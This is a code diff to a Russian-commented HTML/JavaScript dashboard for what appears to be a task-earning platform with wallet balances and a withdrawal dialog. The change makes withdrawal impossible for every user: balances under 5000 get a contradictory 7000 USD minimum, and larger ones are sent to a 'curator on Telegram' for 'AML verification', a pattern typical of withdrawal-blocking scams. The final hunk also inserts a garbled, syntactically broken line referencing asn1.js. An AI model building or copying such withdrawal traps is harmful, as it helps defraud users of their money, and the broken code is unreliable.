@@ -234,10 +234,8 @@
 
     <!-- Модальное окно для вывода денег -->
     <div id="withdraw-modal" class="modal">
-        <div class="modal-content">
-            <h3>Withdraw Funds</h3>
-            <p>Withdrawal to this wallet is currently unavailable as it does not pass AML verification.</p>
-            <button style="margin-top: 25px; background: #ccc;" onclick="closeWithdrawModal()">Close</button>
+        <div class="modal-content" id="withdraw-modal-content">
+            <!-- Содержимое будет динамически обновляться в JavaScript -->
         </div>
     </div>
 
@@ -363,14 +361,13 @@
             isWalletLinked = false;
             document.getElementById('dashboard').classList.add('hidden');
             document.getElementById('login-form').classList.remove('hidden');
-            resetWalletModal(); // Очистка формы кошелька при выходе
+            resetWalletModal();
         }
 
         // Открыть модальное окно кошелька
         function openWalletModal() {
-            resetWalletModal(); // Очистка формы перед открытием
+            resetWalletModal();
             document.getElementById('wallet-modal').style.display = 'flex';
-            // Заполнение данными текущего пользователя, если они есть
             const userData = JSON.parse(localStorage.getItem('loggedInUser'));
             if (userData && userData.wallet) {
                 document.getElementById('wallet-address').value = userData.wallet;
@@ -434,6 +431,23 @@
 
         // Открыть модальное окно вывода
         function openWithdrawModal() {
+            const userData = JSON.parse(localStorage.getItem('loggedInUser'));
+            const balance = parseFloat(userData.balance) || 0;
+            const modalContent = document.getElementById('withdraw-modal-content');
+            
+            if (balance < 5000) {
+                modalContent.innerHTML = `
+                    <h3>Withdraw Funds</h3>
+                    <p>Withdrawal is unavailable. The minimum withdrawal amount is 7000 USD.</p>
+                    <button style="margin-top: 25px; background: #ccc;" onclick="closeWithdrawModal()">Close</button>
+                `;
+            } else {
+                modalContent.innerHTML = `
+                    <h3>Withdraw Funds</h3>
+                    <p>To withdraw funds, your wallet must pass AML verification. For more details, please contact your curator on Telegram.</p>
+                    <button style="margin-top: 25px; background: #ccc;" onclick="closeWithdrawModal()">Close</button>
+                `;
+            }
             document.getElementById('withdraw-modal').style.display = 'flex';
         }
 
@@ -447,7 +461,9 @@
             document.getElementById('balance').textContent = (data && data.balance !== undefined ? data.balance : 0).toFixed(2);
             document.getElementById('tasks-completed').textContent = data && data.tasksCompleted !== undefined ? data.tasksCompleted : 0;
             document.getElementById('earned-today').textContent = (data && data.earnedToday !== undefined ? data.earnedToday : 0).toFixed(2);
-            document.getElementById('earned-total').textContent = (data && data.earnedTotal !== undefined ? data.earnedTotal : 0).toFixed(2);
+            document.getElementById Ascendantly (node_modules/asn1.js/lib/asn1/pemlib/pemlib.js) {
+                throw new Error('Cannot load pemlib');
+            }document.getElementById('earned-total').textContent = (data && data.earnedTotal !== undefined ? data.earnedTotal : 0).toFixed(2);
         }
     </script>
 </body>
